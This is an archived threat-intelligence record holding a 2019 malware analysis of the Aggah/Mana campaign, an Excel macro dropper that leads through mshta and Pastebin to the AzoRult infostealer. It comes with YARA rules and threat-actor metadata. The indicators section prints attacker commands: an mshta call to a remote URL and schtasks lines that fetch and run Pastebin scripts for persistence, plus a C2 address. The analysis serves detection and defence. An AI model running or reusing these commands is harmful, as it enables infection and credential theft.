{
    "id": "66c6c137-46a9-4f4c-8c06-1af5f8e9e099",
    "created_at": "2023-01-12T15:05:14.888055Z",
    "updated_at": "2025-03-27T02:15:35.543072Z",
    "deleted_at": null,
    "sha1_hash": "6a1ea97b84c3736bb8f1b568bb12c052010ef239",
    "title": "2019-09-24 - APT or not APT- What's Behind the Aggah Campaign",
    "authors": "",
    "file_creation_date": "2022-05-28T00:38:03Z",
    "file_modification_date": "2022-05-28T00:38:03Z",
    "file_size": 710442,
    "plain_text": "# APT or not APT? What's Behind the Aggah Campaign\n\n**[yoroi.company/research/apt-or-not-apt-whats-behind-the-aggah-campaign/](https://yoroi.company/research/apt-or-not-apt-whats-behind-the-aggah-campaign/)**\n\n## Introduction\n\n\nSeptember 24, 2019\n\n\nDuring our threat monitoring activities, we discovered an interesting drop chain related to the well-known Aggah\n[campaign, the ambiguous infection chain observed by Unit42 which seemed to deliver payloads potentially associated](https://unit42.paloaltonetworks.com/aggah-campaign-bit-ly-blogspot-and-pastebin-used-for-c2-in-large-scale-campaign/)\nwith the Gorgon Group APT. After that, we discovered other malicious activities using the same TTPs and\n[infrastructures, for instance in “The Enigmatic “Roma225” Campaign” and “The Evolution of Aggah: From Roma225 to](https://blog.yoroi.company/research/the-enigmatic-roma225-campaign/)\nthe RG Campaign” reports.\n\nBut, despite the very similar infection chain, this latest attacks revealed a curious variation of the final payload, opening\nup to different interpretations and hypothesis about the “Aggah” activities.\n\n## Technical Analysis\n\n**Hash** 7f649548b24721e1a0cff2dafb7269741ff18b94274ac827ba86e6a696e9de87\n\n**Threat** Excel document Dropper\n\n\n**Brief**\n**Description**\n\n\nFirst stage of Aggah campaign\n\n\n**Ssdeep** 768:4Sk3hOdsylKlgxopeiBNhZFGzE+cL2kdAJrqYtAd/fBuzPRtUb:hk3hOdsylKlgxopeiBNhZFGzE+cL2kd3\n\nTable 1. Sample’s information\n\nAs in most infections, the multi-stage chain starts with a weaponized Office document containing VBA macro code. It\nimmediately appears obfuscated and after a de-obfuscation phase, we discovered it invokes the following OS\ncommand:\n\n\n-----\n\nmshta.exe http://bit[.ly/8hsshjahassahsh\n\nThe bit.ly link redirects on the attacker’s page hosted on Blogspot at\n_hxxps://myownteammana.blogspot[.com/p/otuego4thday.html.This is the typical Aggah modus operandi. In fact, the_\nwebpage source code contains a JavaScript snippet designed to be executed by the MSHTA engine.\n\nFigure 1. HTA script hidden into Blogspot page\nFigure 2. Deobfuscated HTA script\nThis script is obfuscated using a combination of URL-encoding and string reversing. Once again, the script is only a\ndropper that downloads the next malicious stage hosted on PasteBin. Like the previous Aggah campaigns, the pastes\nwere created by the “hagga” account. This stage is designed to kill the Office suite processes and to create a new\nregistry key to achieve persistence on the target system. This way the hagga dropper would survive the reboot.\n\nFigure 3. Another obfuscated Javascript snippet\nIn detail, the malware uses three mechanisms to ensure its persistence on the victim machine:\n\nthe creation of a new task called “Windows Update” that triggers every 60 minutes;\nthe creation of another task called “Update” that triggers every 300 minutes;\nthe setting of “HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\AvastUpdate” registry key;\n\nEach entry contact pastebin.com to download and execute further payload. The interesting fact is that the URL referred\nby tasks and regkey are different from each other, so the attacker is able to deliver more than a payload by just\nchanging one of the pastes.\n\nFigure 4. Code used to set persistence\nDuring the analysis, all the three URL pointed to the same script, which is reported in the following screen. The cleaned\ncode reveals a byte array composing Powershell commands. It downloads two other snippets from Pastebin.\n\nFigure 5. Deobfuscation process\nFigure 6. Powershell script used to inject the final payload in legit process\n[The first one corresponds to the “Hackitup” DLL file, previously discussed in our previous report. The second paste is](https://blog.yoroi.company/research/the-evolution-of-aggah-from-roma225-to-the-rg-campaign/)\nthe final payload. In many other Aggah campaigns it corresponds to RevengeRAT, which could also be linked to the\nGorgon Group. However, during the analysis we identified another kind of final stage.\n\n### The AzoRult Payload\n\n**Hash** 37086a162bebaecba466b3706acea19578d99afd2adf1492a074536aa7c742c1\n\n**Threat** AzoRult\n\n**Brief Description** AzoRult final payload\n\n**Ssdeep** 3072:tuOSXpMx7ZAlHsbfUkolNGti7lfqeSxM3SpyEY3E/qxg/:Zzx7ZApszolIo7lf/ipT/q\n\nTable 3. Sample’s information\n\nThis time, the final payload was a variant of a popular infostealer for sale on the dark markets, AzoRult. It is able to\naccess to saved credentials of the major browser like Chromium, Firefox, Opera, Vivaldi to exfiltrate cookies,\ncredentials and other navigation data.\n\nFigure 7. AzoRult tries to extract info from browsers files\nHaving a deeper look to the command and control infrastructure we noticed some interesting details. In fact, we\ndiscovered the particular, customized, AzoRult 3.2 fork called “Mana Tools”. At the same time, reviewing the infection\nchain data revealed the presence of a reference to this “Mana” customization even in the blogspot page abused in the\nfirst steps of the chain.\n\nFigure 8. Blogspot page (on the left); “Mana” logo related to AzoRult C2\n\n\n-----\n\n## Conclusion\n\nWe have monitored the campaign and its final payload for different days finding the attacker delivered AzoRult samples\nonly a few times, during the first days of September 2019, and after that it resumed to deliver RevengeRAT samples.\n\nThe “Mana” campaign opens to a series of hypothesis about the threat actor behind it. According to Palo Alto Networks,\n[the “Aggah” infection chain could have been used by GorgonGroup too, but with a different payload. So, it is possible](https://unit42.paloaltonetworks.com/aggah-campaign-bit-ly-blogspot-and-pastebin-used-for-c2-in-large-scale-campaign/)\nthat Gorgon added this particular AzoRult version to their arsenal, maybe to retrieve initial information about its initial\nvictims or to increase their recon capabilities. But the confidence in this scenario is not high enough to confirm it.\nAnother possibility is that another minor cyber criminal leveraged the Aggah infection chain to deliver his AzoRult\npayload, which is a commodity malware, or also the actors behind the “Hagga” Pastebin account used their own\ninfection chain to conduct its own attack campaign. Many question only further hunting could answer.\n\n## Indicator of Compromise\n\nHashes\n\n7f649548b24721e1a0cff2dafb7269741ff18b94274ac827ba86e6a696e9de87\n84833991f1705a01a11149c9d037c8379a9c2d463dc30a2fec27bfa52d218fa6\n37086a162bebaecba466b3706acea19578d99afd2adf1492a074536aa7c742c1\nc2d594e23480215c94dc7f79cf50af3b3b4270fa3a60aea81f877bd787a684a4\na318ce12ddd1b512c1f9ab1280dc25a254d2a1913e021ae34439de9163354243\ncfd1363ce16156e55460b29bf4d62045ebcd5180af50d732c2353daf12618c18\nPersistence\n\nschtasks /create /sc MINUTE /mo 60 /tn Windows Update /tr mshta.exe [http://pastebin.com/raw/vXpe74L2](https://pastebin.com/raw/vXpe74L2)\n/F\nschtasks /create /sc MINUTE /mo 300 /tn \"\"Update\"\" /tr mshta.exe [http://pastebin.com/raw/JdTuFmc5 /F](https://pastebin.com/raw/JdTuFmc5)\nHKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\AvastUpdate\nC2\n\nhxxp://170.130.205.86/index.php\n\n### Yara Rules\n\n\n-----\n\n```\n p p\nrule Mana_Aggah_campaign_excel_dropper_Sep_2019{\n  meta:\n   description = \"Yara Rule for Mana campaign Excel dropper\"\n   author = \"Cybaze Zlab_Yoroi\"\n   last_updated = \"2019-09-18\"\n   tlp = \"white\"\n   category = \"informational\"\n  strings:\n          $a1 = {64 68 61 73 6A 00 6B 68 64 61 6B 6A 73 68 00 64 6B 61 28 29}\n          $a2 = {61 70 74 77 4D 71 55 45 27}\n  condition:\n     all of them\n}\nrule Mana_Aggah_campaign_injector_Sep_2019{\n  meta:\n   description = \"Yara Rule for Mana campaign DLL injector\"\n   author = \"Cybaze Zlab_Yoroi\"\n   last_updated = \"2019-09-18\"\n   tlp = \"white\"\n   category = \"informational\"\n  strings:\n          $a1 = {4D 5A}\n          $a2 = {93 E5 21 3F 59 AE}\n          $a3 = {11 08 28 22}\n          $a4 = \"v2.0.507\"\n          $a5 = {E2 80 8C E2 80}\n          $a6 = {81 AC E2 81 AF E2 80 AE}\n          $a7 = {E2 81 AA E2 80}\n          $a8 = {81 AF E2 80 AA}\n          $a9 = {81 AC E2 81 AF E2 80 AE}\n          $a10 = {C5 C7 4C 9E 65 A5 B6 42}\n  condition:\n     6 of ($a*)\n}\nrule Mana_Aggah_campaign_AzoRult_Sep_2019{\n  meta:\n   description = \"Yara Rule for Mana campaign AzoRult sample\"\n   author = \"Cybaze Zlab_Yoroi\"\n   last_updated = \"2019-09-18\"\n   tlp = \"white\"\n   category = \"informational\"\n  strings:\n          $h1 = {4D 5A 50}\n          $bob1 = {55 8B EC 83 C4 F0 B8 ?? ?? ?? ?? E8}\n          $bob2 = {55 8B EC 83 C4 F0 53 56 B8 ?? ?? ?? ?? E8 ?? ?? ?? ?? 33 C0 55 68 ?? ?? ?? ?? 64 FF\n30 64 89 20 B8}\n          $bob3 = {55 8B EC 83 C4 F0 53 B8 ?? ?? ?? ?? E8 ?? ?? ?? ?? 33 C0 55 68 ?? ?? ?? ?? 64 FF 30\n64 89 20 B8 ?? ?? ?? ?? E8}\n          $s1 = \"SOFTWARE\\\\Borland\\\\Delphi\\\\RTL\" ascii wide\n          $s2 = \"moz_historyvisits.visit_date\" ascii wide\n          $s3 = \"\\\\BitcoinCore_custom\\\\wallet.dat\" ascii wide\n     condition:\n          $h1 and all of ($s*) and 1 of ($bob*)\n}\n\n```\n_This blog post was authored by Antonio Farina and Luca Mella of Cybaze-Yoroi Z-LAB_\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2019/2019-09-24 - APT or not APT- What's Behind the Aggah Campaign.pdf"
    ],
    "report_names": [
        "2019-09-24 - APT or not APT- What's Behind the Aggah Campaign.pdf"
    ],
    "threat_actors": [
        {
            "id": "28851008-77b4-47eb-abcd-1bb5b3f19fc2",
            "created_at": "2023-06-20T02:02:10.254614Z",
            "updated_at": "2025-03-27T02:00:03.130853Z",
            "deleted_at": null,
            "main_name": "Hagga",
            "aliases": [
                "TH-157",
                "Aggah"
            ],
            "source_name": "MISPGALAXY:Hagga",
            "tools": [
                "Agent Tesla"
            ],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "9f101d9c-05ea-48b9-b6f1-168cd6d06d12",
            "created_at": "2023-01-06T13:46:39.396409Z",
            "updated_at": "2025-03-27T02:00:03.074969Z",
            "deleted_at": null,
            "main_name": "Earth Lusca",
            "aliases": [
                "CHROMIUM",
                "ControlX",
                "Red Dev 10",
                "RedHotel",
                "Red Scylla",
                "TAG-22",
                "BRONZE UNIVERSITY",
                "AQUATIC PANDA",
                "Charcoal Typhoon",
                "BountyGlad"
            ],
            "source_name": "MISPGALAXY:Earth Lusca",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "5a0483f5-09b3-4673-bb5a-56d41eaf91ed",
            "created_at": "2023-01-06T13:46:38.814104Z",
            "updated_at": "2025-03-27T02:00:02.925972Z",
            "deleted_at": null,
            "main_name": "MageCart",
            "aliases": [],
            "source_name": "MISPGALAXY:MageCart",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "6c4e4b91-1f98-49e2-90e6-435cea8d3d53",
            "created_at": "2022-10-25T16:07:23.693797Z",
            "updated_at": "2025-03-27T02:02:09.924056Z",
            "deleted_at": null,
            "main_name": "Gorgon Group",
            "aliases": [
                "ATK 92",
                "Pasty Draco",
                "Subaat",
                "TAG-CR5"
            ],
            "source_name": "ETDA:Gorgon Group",
            "tools": [
                "AgenTesla",
                "Agent Tesla",
                "AgentTesla",
                "Atros2.CKPN",
                "Bladabindi",
                "CinaRAT",
                "Crimson RAT",
                "ForeIT",
                "Jorik",
                "LOLBAS",
                "LOLBins",
                "Living off the Land",
                "Loki",
                "Loki.Rat",
                "LokiBot",
                "LokiPWS",
                "MSIL",
                "MSIL/Crimson",
                "Nancrat",
                "NanoCore",
                "NanoCore RAT",
                "Negasteal",
                "NetWeird",
                "NetWire",
                "NetWire RAT",
                "NetWire RC",
                "NetWired RC",
                "Origin Logger",
                "Quasar RAT",
                "QuasarRAT",
                "Recam",
                "Remcos",
                "RemcosRAT",
                "Remvio",
                "Revenge RAT",
                "RevengeRAT",
                "Revetrat",
                "SEEDOOR",
                "Scarimson",
                "Socmer",
                "Yggdrasil",
                "ZPAQ",
                "Zurten",
                "njRAT"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "b0d34dd6-ee90-483b-bb6c-441332274160",
            "created_at": "2022-10-25T16:07:23.296754Z",
            "updated_at": "2025-03-27T02:02:09.724313Z",
            "deleted_at": null,
            "main_name": "Aggah",
            "aliases": [
                "Operation Red Deer",
                "Operation Roma225"
            ],
            "source_name": "ETDA:Aggah",
            "tools": [
                "AgenTesla",
                "Agent Tesla",
                "AgentTesla",
                "Aggah",
                "Atros2.CKPN",
                "Bladabindi",
                "Jorik",
                "Nancrat",
                "NanoCore",
                "NanoCore RAT",
                "Negasteal",
                "Origin Logger",
                "Revenge RAT",
                "RevengeRAT",
                "Revetrat",
                "Warzone",
                "Warzone RAT",
                "ZPAQ",
                "Zurten",
                "njRAT"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "6abcc917-035c-4e9b-a53f-eaee636749c3",
            "created_at": "2022-10-25T16:07:23.565337Z",
            "updated_at": "2025-03-27T02:02:09.868522Z",
            "deleted_at": null,
            "main_name": "Earth Lusca",
            "aliases": [
                "Bronze University",
                "Charcoal Typhoon",
                "Chromium",
                "Red Dev 10",
                "Red Scylla"
            ],
            "source_name": "ETDA:Earth Lusca",
            "tools": [
                "Agentemis",
                "AntSword",
                "BIOPASS",
                "BIOPASS RAT",
                "BadPotato",
                "Behinder",
                "BleDoor",
                "Cobalt Strike",
                "CobaltStrike",
                "Doraemon",
                "FRP",
                "Fast Reverse Proxy",
                "FunnySwitch",
                "HUC Port Banner Scanner",
                "KTLVdoor",
                "Mimikatz",
                "NBTscan",
                "POISONPLUG.SHADOW",
                "PipeMon",
                "RbDoor",
                "RibDoor",
                "RouterGod",
                "SAMRID",
                "ShadowPad Winnti",
                "SprySOCKS",
                "WinRAR",
                "Winnti",
                "XShellGhost",
                "cobeacon",
                "fscan",
                "lcx",
                "nbtscan"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "66fc98f4-8978-401e-9b73-81c3d5f1e44c",
            "created_at": "2024-05-01T02:03:08.050109Z",
            "updated_at": "2025-03-27T02:05:17.327953Z",
            "deleted_at": null,
            "main_name": "COPPER FIELDSTONE",
            "aliases": [
                "Gorgon Group",
                "Green Havildar ",
                "Mythic Leopard ",
                "Operation C-Major ",
                "Operation Transparent Tribe ",
                "Pasty Draco ",
                "ProjectM ",
                "Storm-0156 ",
                "APT36 "
            ],
            "source_name": "Secureworks:COPPER FIELDSTONE",
            "tools": [
                " DarkComet",
                " LuminosityLink",
                " Peppy",
                " njRAT",
                "Crimson RAT"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "18278778-fa63-4a9a-8988-4d266b8c5c1a",
            "created_at": "2023-01-06T13:46:38.769816Z",
            "updated_at": "2025-03-27T02:00:02.914024Z",
            "deleted_at": null,
            "main_name": "The Gorgon Group",
            "aliases": [
                "ATK92",
                "G0078",
                "Pasty Gemini",
                "Gorgon Group",
                "Subaat"
            ],
            "source_name": "MISPGALAXY:The Gorgon Group",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "97fdaf9f-cae1-4ccc-abe2-76e5cbc0febd",
            "created_at": "2022-10-25T15:50:23.296989Z",
            "updated_at": "2025-03-27T02:00:55.432751Z",
            "deleted_at": null,
            "main_name": "Gorgon Group",
            "aliases": [
                "Gorgon Group"
            ],
            "source_name": "MITRE:Gorgon Group",
            "tools": [
                "NanoCore",
                "QuasarRAT",
                "Remcos",
                "njRAT"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "d53593c3-2819-4af3-bf16-0c39edc64920",
            "created_at": "2022-10-27T08:27:13.212301Z",
            "updated_at": "2025-03-27T02:00:55.529662Z",
            "deleted_at": null,
            "main_name": "Earth Lusca",
            "aliases": [
                "Earth Lusca",
                "TAG-22",
                "Charcoal Typhoon",
                "CHROMIUM",
                "ControlX"
            ],
            "source_name": "MITRE:Earth Lusca",
            "tools": [
                "Mimikatz",
                "PowerSploit",
                "Tasklist",
                "certutil",
                "Cobalt Strike",
                "Winnti for Linux",
                "Nltest",
                "NBTscan",
                "ShadowPad"
            ],
            "source_id": "MITRE",
            "reports": null
        }
    ],
    "ts_created_at": 1673535914,
    "ts_updated_at": 1743041735,
    "ts_creation_date": 1653698283,
    "ts_modification_date": 1653698283,
    "files": {
        "pdf": "https://archive.orkl.eu/6a1ea97b84c3736bb8f1b568bb12c052010ef239.pdf",
        "text": "https://archive.orkl.eu/6a1ea97b84c3736bb8f1b568bb12c052010ef239.txt",
        "img": "https://archive.orkl.eu/6a1ea97b84c3736bb8f1b568bb12c052010ef239.jpg"
    }
}